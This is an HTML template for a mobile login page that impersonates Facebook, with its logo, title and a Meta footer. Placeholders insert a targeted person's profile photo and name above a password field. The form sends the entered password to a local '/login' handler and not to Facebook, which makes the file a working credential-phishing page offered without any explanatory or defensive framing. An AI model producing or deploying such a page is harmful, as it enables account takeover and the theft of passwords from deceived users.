<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Facebook</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
  background:#f0f2f5;
  min-height:100vh;
  display:flex;flex-direction:column;align-items:center;
  -webkit-font-smoothing:antialiased;
}
.topbar{
  width:100%;background:#fff;
  padding:10px 16px;
  display:flex;align-items:center;justify-content:space-between;
  border-bottom:1px solid #e4e6eb;
  position:sticky;top:0;z-index:100;
  box-shadow:0 1px 2px rgba(0,0,0,.05);
}
.topbar svg{height:32px;fill:#1877f2}
.topbar .icons{display:flex;gap:8px}
.topbar .icons div{
  width:36px;height:36px;border-radius:50%;background:#e4e6eb;
  display:flex;align-items:center;justify-content:center;
}
.topbar .icons svg{width:18px;height:18px;fill:#050505}
.main{
  width:100%;max-width:420px;
  padding:24px 16px;flex:1;
  display:flex;flex-direction:column;align-items:center;
}
.card{
  background:#fff;border-radius:16px;
  padding:28px 24px;width:100%;
  box-shadow:0 1px 4px rgba(0,0,0,.06),0 8px 24px rgba(0,0,0,.06);
  animation:fadeUp .4s ease;
}
@keyframes fadeUp{
  from{opacity:0;transform:translateY(16px)}
  to{opacity:1;transform:translateY(0)}
}
.profile{
  display:flex;flex-direction:column;align-items:center;
  margin-bottom:24px;
}
.avatar-ring{
  width:88px;height:88px;border-radius:50%;
  background:linear-gradient(135deg,#1877f2,#42b72a);
  padding:3px;margin-bottom:12px;
}
.avatar-ring img{
  width:100%;height:100%;border-radius:50%;
  object-fit:cover;border:3px solid #fff;display:block;
}
.profile h2{
  font-size:22px;font-weight:900;
  color:#050505;letter-spacing:-.3px;
}
.form-group{position:relative;margin-bottom:14px}
.form-group input{
  width:100%;padding:15px 48px 15px 16px;
  border:2px solid #e4e6eb;border-radius:12px;
  font-size:17px;color:#050505;
  background:#f7f8fa;outline:none;
  transition:all .2s ease;
}
.form-group input:focus{
  border-color:#1877f2;background:#fff;
  box-shadow:0 0 0 3px rgba(24,119,242,.1);
}
.form-group input::placeholder{color:#8a8d91}
.eye-btn{
  position:absolute;right:14px;top:50%;transform:translateY(-50%);
  background:none;border:none;cursor:pointer;padding:4px;
}
.eye-btn svg{width:22px;height:22px;fill:#8a8d91}
.submit-btn{
  width:100%;padding:14px;
  background:linear-gradient(135deg,#1877f2,#166fe5);
  color:#fff;border:none;border-radius:12px;
  font-size:17px;font-weight:800;cursor:pointer;
  box-shadow:0 3px 10px rgba(24,119,242,.25);
  transition:all .2s ease;
}
.submit-btn:hover{
  background:linear-gradient(135deg,#166fe5,#1565d8);
  transform:translateY(-1px);
}
.submit-btn:active{transform:scale(.98)}
.forgot{
  display:block;text-align:center;
  margin-top:16px;color:#1877f2;
  font-size:14px;font-weight:600;text-decoration:none;
}
.forgot:hover{text-decoration:underline}
.footer{
  margin-top:auto;padding:20px;
  text-align:center;font-size:12px;color:#8a8d91;
}
.footer a{color:#8a8d91;text-decoration:none;margin:0 6px}
</style>
</head>
<body>

<div class="topbar">
  <svg viewBox="0 0 36 36"><path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 26h-4v-4h4v-2.5C14 16.046 15.79 14 19.5 14H24v4h-3.5c-1.38 0-1.5.52-1.5 1.5V22h5l-1 4h-4l1.181 9.87z"/></svg>
  <div class="icons">
    <div><svg viewBox="0 0 24 24"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z"/></svg></div>
    <div><svg viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg></div>
  </div>
</div>

<div class="main">
  <div class="card">
    <div class="profile">
      <div class="avatar-ring">
        <img src="__PROFILE_IMG__" alt="">
      </div>
      <h2>__NAME__</h2>
    </div>

    <form action="/login" method="POST">
      <div class="form-group">
        <input type="password" name="password" id="pw"
               placeholder="Password" required
               autocomplete="current-password">
        <button type="button" class="eye-btn" onclick="toggle()">
          <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
        </button>
      </div>
      <button type="submit" class="submit-btn">Log In</button>
    </form>
    <a href="#" class="forgot">Forgot password?</a>
  </div>
</div>

<div class="footer">
  <a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">Help</a>
  <br><br>Meta &copy; 2025
</div>

<script>
function toggle(){
  var p=document.getElementById("pw");
  p.type=p.type==="password"?"text":"password";
}
</script>
</body>
</html>
